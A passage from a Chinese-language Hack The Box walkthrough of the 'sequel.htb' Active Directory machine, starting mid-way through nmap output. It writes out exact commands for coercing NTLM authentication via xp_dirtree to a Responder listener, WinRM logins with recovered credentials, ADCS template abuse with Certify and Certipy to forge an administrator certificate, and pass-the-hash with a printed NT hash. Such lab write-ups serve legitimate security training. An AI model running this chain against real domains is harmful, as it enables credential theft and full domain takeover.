389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2025-02-12T07:00:28
|_Not valid after:  2026-02-12T07:00:28
|_ssl-date: 2025-02-13T16:09:36+00:00; +7h43m05s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2025-02-12T07:00:28
|_Not valid after:  2026-02-12T07:00:28
|_ssl-date: 2025-02-13T16:09:34+00:00; +7h43m04s from scanner time.
1433/tcp  open  ms-sql-s          Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.10.11.202:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.10.11.202:1433: 
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2025-02-13T16:09:36+00:00; +7h43m05s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-02-11T23:10:48
|_Not valid after:  2055-02-11T23:10:48
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-02-13T16:09:36+00:00; +7h43m05s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2025-02-12T07:00:28
|_Not valid after:  2026-02-12T07:00:28
3269/tcp  open  globalcatLDAPssl?
|_ssl-date: 2025-02-13T16:09:36+00:00; +7h43m05s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2025-02-12T07:00:28
|_Not valid after:  2026-02-12T07:00:28
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  unknown
49689/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49690/tcp open  unknown
49708/tcp open  unknown
49727/tcp open  unknown
49746/tcp open  unknown
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-02-13T16:08:04
|_  start_date: N/A
|_clock-skew: mean: 7h43m04s, deviation: 0s, median: 7h43m04s

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   379.72 ms 10.10.16.1
2   611.84 ms 10.10.11.202

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 747.69 seconds
```

常规下一步smb

```
smbmap -u guest -H 10.10.11.202
```

![image-20250213191957196](./HTB_Active_Directory.assets/image-20250213191957196.png)

Public比较吸引人

```
smbclient //10.10.11.202/Public -N
```

![image-20250213192103691](./HTB_Active_Directory.assets/image-20250213192103691.png)

只有一个PDF，下载下来看看

![image-20250213192422395](./HTB_Active_Directory.assets/image-20250213192422395.png)

给了一个sqlserver的用户和密码，还有域外机器连接方式

```
publicuser/GuestUserCantWrite1
cmdkey /add:"<serverName>.sequel.htb" /user:"sequel\<userame>" /pass:<password>
cmdkey /add:"10.10.11.202" /user:"sequel\publicuser" /pass:GuestUserCantWrite1
```

首先安装dbeaver，使用dbeaver连接mssql数据库

![image-20250213193415502](./HTB_Active_Directory.assets/image-20250213193415502.png)

> SQLSEVER 在域中结合中继委派的玩法：
>
> 在关于 SQLSERVER 的利用中，通过 xp_dirtree + UNC 可以触发 NTLM 认证，带出服务器的 NET-NTLM hash

responder监听网卡，并执行sql语句

```
responder -I tun0 
exec master.dbo.xp_dirtree '\\10.10.16.15\test'
```

![image-20250213195125699](./HTB_Active_Directory.assets/image-20250213195125699.png)

就可以收到认证信息，使用john离线破解hash

![image-20250213195343153](./HTB_Active_Directory.assets/image-20250213195343153.png)

拿到一个用户名和密码

```
sql_svc/REGGIE1234ronnie
```

尝试使用evil-winrm连接

```
evil-winrm -i 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie'
```

![image-20250213195550465](./HTB_Active_Directory.assets/image-20250213195550465.png)

在桌面并没有找到flag，进一步信息收集，仔细翻了翻文件，在mssql的日志文件找到一个可疑的BAK文件

![image-20250213200547982](./HTB_Active_Directory.assets/image-20250213200547982.png)

找到像用户名和密码的Ryan.Cooper/NuclearMosquito3

PS：其实提交flag那里说了要Ryan.Cooper用户桌面的.....

![image-20250213200647696](./HTB_Active_Directory.assets/image-20250213200647696.png)

连接！

```
evil-winrm -i 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3'
```

![image-20250213200842751](./HTB_Active_Directory.assets/image-20250213200842751.png)

拿到flag1，然后看了下该用户权限，没有值得注意的，这题考点应该不在这里，继续翻文件

看了下hints，提示ADCS

> **Active Directory Certificate Services (ADCS)** 是 Microsoft 提供的证书管理服务，用于颁发、管理和验证数字证书。在 Windows 环境中，ADCS 可以用来为网络中的设备、用户和服务颁发数字证书，提供身份验证和加密保护。

这里搜到了一个工具：Certify.exe (https://github.com/GhostPack/Certify)，需要自己编译一下（最近用的好多工具都是这样......

```
列举可能的证书颁发机构：
.\Certify.exe cas
```

![image-20250213203951164](./HTB_Active_Directory.assets/image-20250213203951164.png)

```
枚举有漏洞的证书
.\Certify.exe find /vulnerable
```

![image-20250213204116310](./HTB_Active_Directory.assets/image-20250213204116310.png)

找到了一个，GPT解答如下：

> ### 主要输出的关键点：
>
> - **Enterprise CA**：`sequel-DC-CA`，证书颁发机构位于 `dc.sequel.htb`。
> - **易受攻击的证书模板**：`UserAuthentication`，它允许用户通过提供证书请求认证。
> - **权限**：`Domain Admins` 和 `Enterprise Admins` 等具有证书请求权限，且该模板的 `msPKI-Certificate-Name-Flag` 属性是 `ENROLLEE_SUPPLIES_SUBJECT`，意味着请求者可以提供自己的证书主题，可能导致伪造证书的风险。

certipy：https://github.com/ly4k/Certipy.git

```
certipy-ad req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -upn administrator@sequel.htb -target sequel.htb -ca sequel-dc-ca -template UserAuthentication
```

> 有个坑，提示time out就多运行几次！

![image-20250213211126638](./HTB_Active_Directory.assets/image-20250213211126638.png)

> 现在我们有了管理员的证书，还需要再次使用 certipy 来获取票证授予票证 （TGT） 并提取此用户的 NT 哈希值。由于此步骤需要一些 Kerberos 交互，因此我们需要先将时钟与远程计算机的时间同步，然后才能继续。

```
同步时间(一定要)：
sudo ntpdate -u dc.sequel.htb

certipy-ad auth -pfx administrator.pfx
```

![image-20250213212258956](./HTB_Active_Directory.assets/image-20250213212258956.png)

拿到hash，记得把时间改回来（笑死

```
evil-winrm -i 10.10.11.202 -u 'administrator' -H 'a52f78e4c751e5f5e17e1e9f3e58f4ee'
```

![image-20250213212537812](./HTB_Active_Directory.assets/image-20250213212537812.png)

拿到flag2，HTB域暂时完结！













